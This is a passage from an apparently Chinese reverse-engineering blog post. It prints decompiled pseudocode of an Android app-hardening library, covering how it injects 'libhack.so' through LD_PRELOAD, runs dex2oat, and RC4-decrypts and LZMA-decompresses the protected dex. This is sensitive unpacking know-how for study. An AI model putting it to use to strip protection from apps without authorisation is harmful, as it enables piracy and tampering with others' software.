class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v63, <span class="string">"arm"</span>, &amp;v51);</span><br><span class="line">  <span class="keyword">switch</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v3 = <span class="string">"arm"</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;v63, v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v3 = <span class="string">"x86"</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      v3 = <span class="string">"mips"</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      v3 = <span class="string">"arm64"</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      v3 = <span class="string">"x86_64"</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v64, &amp;ali::g_libPath, <span class="string">"/libhack.so"</span>);</span><br><span class="line">  v4 = getenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"the system already define LD_PRELOAD=%s"</span>, v4);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v84, v5, v52);</span><br><span class="line">    v6 = v86;</span><br><span class="line">    v7 = v85;</span><br><span class="line">    <span class="keyword">while</span> ( v6 != (<span class="keyword">unsigned</span> __int8 *)v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *v6++;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">32</span> )</span><br><span class="line">        *(v6 - <span class="number">1</span>) = <span class="number">58</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v87, &amp;v84, <span class="string">":"</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v88, &amp;v87, &amp;v64);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v64, v90, v89);</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v88);</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v87);</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v84);</span><br><span class="line">  &#125;</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"the new LD_PRELOAD is %s"</span>, v65);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v66, &amp;ali::g_filePath, <span class="string">"/juice.data"</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v67, &amp;ali::g_filePath, <span class="string">"/fak.jar"</span>);</span><br><span class="line">  fd = open(v68, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%d"</span>, fd);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v69, &amp;s, v52);</span><br><span class="line">  v73 = &amp;v72;</span><br><span class="line">  v74 = &amp;v72;</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_allocate_block(&amp;v72, v55 - v56 + <span class="number">10</span>);</span><br><span class="line">  *v73 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::_M_appendT&lt;<span class="keyword">char</span> <span class="keyword">const</span>*&gt;(&amp;v72, <span class="string">"DEX_FILE="</span>, <span class="string">""</span>, v52);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::append((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v72, (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v54);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v75, &amp;v72, <span class="string">"                     JUICE_FILE="</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v76, &amp;v75, &amp;v66);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v77, &amp;v76, <span class="string">"                     LD_PRELOAD="</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v78, &amp;v77, &amp;v64);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">    &amp;v79,</span><br><span class="line">    &amp;v78,</span><br><span class="line">    <span class="string">"                     /system/bin/dex2oat \t\t\t\t  \t --runtime-arg -Xms64m \t\t\t\t\t --runtime-arg -Xmx64m \t\t\t\t"</span></span><br><span class="line">    <span class="string">"\t --boot-image=/system/framework/boot.art                      --zip-fd="</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v80, &amp;v79, &amp;v69);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v81, &amp;v80, <span class="string">"\t\t\t\t\t --zip-location="</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v82, &amp;v81, &amp;v67);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v83, &amp;v82, <span class="string">"\t\t\t\t\t --oat-file="</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v84, &amp;v83, &amp;v57);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v70, &amp;v84, <span class="string">"                     "</span>);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v84);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v83);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v82);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v81);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v80);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v79);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v78);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v77);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v76);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v75);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v72);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"cmd is %s"</span>, v71);</span><br><span class="line">  system(v71);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v70);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v69);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v67);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v66);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v64);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v63);</span><br><span class="line">LABEL_24:</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"after oat gen"</span>);</span><br><span class="line">  v10 = ali::JDexFile;</span><br><span class="line">  v11 = dword_54140;</span><br><span class="line">  <span class="keyword">if</span> ( ali::sdk_int &lt;= <span class="number">19</span> )                     <span class="comment">// sdk version &lt;= 19</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = _JNIEnv::NewStringUTF(v45, v60);</span><br><span class="line">    v13 = _JNIEnv::NewStringUTF(v45, v58);</span><br><span class="line">    v16 = _JNIEnv::CallStaticIntMethod(v45, v10, v11, v12, v13, <span class="number">0</span>);</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>                                          <span class="comment">// sdk version &gt; 19</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = _JNIEnv::NewStringUTF(v45, v60);</span><br><span class="line">    v15 = _JNIEnv::NewStringUTF(v45, v58);</span><br><span class="line">    v16 = _JNIEnv::CallStaticLongMethod(v45, v10, v11, v14, v15, <span class="number">0</span>);</span><br><span class="line">    v18 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"cookie is %llx"</span>);</span><br><span class="line">  *(_DWORD *)v46 = v16;</span><br><span class="line">  *((_DWORD *)v46 + <span class="number">1</span>) = v18;</span><br><span class="line">  v19 = (<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>))dlsym((<span class="keyword">void</span> *)<span class="number">0xFFFFFFFF</span>, <span class="string">"_ZNK3art7DexFile12FindClassDefEt"</span>);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"DexFile::FindClassDefFn is %p"</span>, v19);</span><br><span class="line">  v20 = v19(v16, <span class="number">1</span>);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"call FindClassDefFn(%p,%d) =&gt; %p"</span>, v16, <span class="number">1</span>, v20);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"dex position is %p"</span>, v20 - <span class="number">572</span>);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"dex head is %08x %08x"</span>, *(_DWORD *)(v20 - <span class="number">572</span>), *(_DWORD *)(v20 - <span class="number">568</span>));</span><br><span class="line">  v21 = *(<span class="keyword">unsigned</span> __int8 **)(v20 - <span class="number">540</span>);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"dex size is %d"</span>, v21);</span><br><span class="line">  MemEnableWrite((<span class="keyword">unsigned</span> __int8 *)(v20 - <span class="number">572</span>), &amp;v21[v20 - <span class="number">572</span>]);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v61, &amp;ali::g_filePath, <span class="string">"/juice.data"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !ali::dex_juicer_patch((ali *)(v20 - <span class="number">572</span>), v21, v62, v22) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v61);</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v59);</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v57);</span><br><span class="line">    v23 = &amp;v54;</span><br><span class="line">LABEL_44:</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(v23);</span><br><span class="line">    _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"exit parse_dex"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _android_log_print(<span class="number">6</span>, <span class="string">"debug"</span>, <span class="string">"fail to patch dex"</span>);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v61);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v59);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v57);</span><br><span class="line">  v24 = &amp;v54;</span><br><span class="line">LABEL_46:</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(v24);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"exit parse_dex error"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 openWithHeader 中，log 了三次 dex 的 magic number，中间分别进行了 RC4 解密和 LZMA 解压缩。最后得到的结果应该就是最终的 dex 文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall ali::EncFile::openWithHeader(ali::EncFile *<span class="keyword">this</span>, <span class="keyword">unsigned</span> __int8 **a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  ali::EncFile *v4; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">__blksize_t</span> v12; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v13; <span class="comment">// r4</span></span><br><span class="line">  ali *v14; <span class="comment">// r0</span></span><br><span class="line">  __int64 v15; <span class="comment">// r0</span></span><br><span class="line">  __int64 v16; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v17; <span class="comment">// r3</span></span><br><span class="line">  ali *v18; <span class="comment">// r0</span></span><br><span class="line">  __int64 v19; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v23; <span class="comment">// r0</span></span><br><span class="line">  ali *v24; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v25; <span class="comment">// r9</span></span><br><span class="line">  ali *v26; <span class="comment">// ST24_4</span></span><br><span class="line">  __int64 v27; <span class="comment">// r0</span></span><br><span class="line">  __int64 v28; <span class="comment">// ST18_8</span></span><br><span class="line">  ali *v29; <span class="comment">// r0</span></span><br><span class="line">  __int64 v30; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">size_t</span> v31; <span class="comment">// [sp+2Ch] [bp-9Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [sp+30h] [bp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [sp+34h] [bp-94h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">buf</span>;</span> <span class="comment">// [sp+38h] [bp-90h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="keyword">this</span>;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a4;</span><br><span class="line">  <span class="keyword">if</span> ( !*((_DWORD *)<span class="keyword">this</span> + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">"file path is null"</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    _android_log_print(<span class="number">6</span>, <span class="string">"debug"</span>, v8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(*((<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="keyword">this</span> + <span class="number">2</span>), <span class="number">0</span>);</span><br><span class="line">  v10 = fstat(fd, &amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">"fstat failed"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = buf.st_blksize;</span><br><span class="line">  *v6 = buf.st_blksize;</span><br><span class="line">  *(_DWORD *)v4 = v12;</span><br><span class="line">  v13 = (<span class="keyword">unsigned</span> __int8 *)mmap(<span class="number">0</span>, *v6, <span class="number">3</span>, <span class="number">2</span>, fd, <span class="number">0</span>);</span><br><span class="line">  *((_DWORD *)v4 + <span class="number">1</span>) = v13;</span><br><span class="line">  close(fd);</span><br><span class="line">  v14 = (ali *)_android_log_print(</span><br><span class="line">                 <span class="number">3</span>,</span><br><span class="line">                 <span class="string">"debug"</span>,</span><br><span class="line">                 <span class="string">"dex magic %c %c %c %c %c %c %c"</span>,<span class="comment">// original dex magic</span></span><br><span class="line">                 *v13,</span><br><span class="line">                 v13[<span class="number">1</span>],</span><br><span class="line">                 v13[<span class="number">2</span>],</span><br><span class="line">                 v13[<span class="number">3</span>],</span><br><span class="line">                 v13[<span class="number">4</span>],</span><br><span class="line">                 v13[<span class="number">5</span>],</span><br><span class="line">                 v13[<span class="number">6</span>]);</span><br><span class="line">  LODWORD(v15) = ali::NanoTime(v14);</span><br><span class="line">  v16 = v15;</span><br><span class="line">  v18 = (ali *)ali::decryptRc4((ali *)v13, v13, (<span class="keyword">unsigned</span> __int8 *)v6, v17);<span class="comment">// RC4 decrypt</span></span><br><span class="line">  LODWORD(v19) = ali::NanoTime(v18);</span><br><span class="line">  ali::PrettyDuration((ali *)(v19 - v16), v19 - v16);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"decrypted len:%u"</span>, *v6);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  _android_log_print(</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    <span class="string">"debug"</span>,</span><br><span class="line">    <span class="string">"after decrypt dex magic %c %c %c %c %c %c %c"</span>,<span class="comment">// dex magic after RC4</span></span><br><span class="line">    *v13,</span><br><span class="line">    v13[<span class="number">1</span>],</span><br><span class="line">    v13[<span class="number">2</span>],</span><br><span class="line">    v13[<span class="number">3</span>],</span><br><span class="line">    v13[<span class="number">4</span>],</span><br><span class="line">    v13[<span class="number">5</span>],</span><br><span class="line">    v13[<span class="number">6</span>]);</span><br><span class="line">  v21 = (<span class="keyword">int</span>)(v13 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">8</span> * v10++;</span><br><span class="line">    v23 = (<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v21++ + <span class="number">1</span>) &lt;&lt; v22;</span><br><span class="line">    v20 += v23;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 != <span class="number">8</span> );</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"unpackSize: %u"</span>, v20);</span><br><span class="line">  *(_DWORD *)v4 = v7 + v20;</span><br><span class="line">  v24 = (ali *)mmap(<span class="number">0</span>, v7 + v20, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  *((_DWORD *)v4 + <span class="number">1</span>) = v24;</span><br><span class="line">  v25 = (<span class="keyword">unsigned</span> __int8 *)v24 + v7;</span><br><span class="line">  v26 = 